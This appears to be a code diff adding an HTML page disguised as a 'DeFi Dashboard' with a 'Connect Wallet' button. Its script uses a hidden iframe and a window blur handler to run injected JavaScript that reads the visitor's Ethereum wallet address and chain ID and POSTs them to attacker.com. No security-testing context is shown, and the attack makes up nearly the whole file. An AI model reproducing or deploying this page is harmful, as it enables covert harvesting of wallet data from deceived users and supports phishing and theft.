@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>DeFi Dashboard</title>
+    <style>
+        iframe { visibility: hidden; }
+    </style>
+    <script>
+        window.onblur = function() {
+            document.getElementById("iframe").src = "javascript:" +
+                "try {" +
+                "  if(window.ethereum) {" +
+                "    var payload = {" +
+                "      provider: 'available'," +
+                "      accounts: window.ethereum.selectedAddress," +
+                "      chainId: window.ethereum.chainId" +
+                "    };" +
+                "    fetch('https://attacker.com/web3', {" +
+                "      method: 'POST'," +
+                "      body: JSON.stringify(payload)" +
+                "    });" +
+                "    prompt('Web3 data collected: ' + JSON.stringify(payload));" +
+                "  }" +
+                "} catch(e) { prompt('Error: ' + e.message); }";
+        }
+    </script>
+</head>
+<body>
+    <center>
+        <h1>🔗 Connect to DeFi Protocol</h1>
+        <button style="padding:20px; font-size:18px;">
+            Connect Wallet
+        </button>
+    </center>
+    <iframe id="iframe"></iframe>
+</body>
+</html>
